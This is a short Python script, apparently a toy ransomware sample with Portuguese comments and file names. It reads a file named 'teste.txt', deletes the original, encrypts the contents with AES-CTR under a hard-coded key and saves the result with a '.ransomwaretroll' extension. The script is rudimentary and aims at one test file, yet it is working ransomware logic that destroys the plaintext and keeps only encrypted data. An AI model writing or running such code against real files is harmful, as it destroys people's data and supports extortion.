import os
import pyaes

file_name = "teste.txt"

with open(file_name, "rb") as file:
    file_data = file.read()

os.remove(file_name)

key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

crypto_data = aes.encrypt(file_data)

new_file_name = file_name + ".ransomwaretroll"
with open(new_file_name, "wb") as new_file:
    new_file.write(crypto_data)

print(f"Arquivo '{file_name}' criptografado como '{new_file_name}'.")
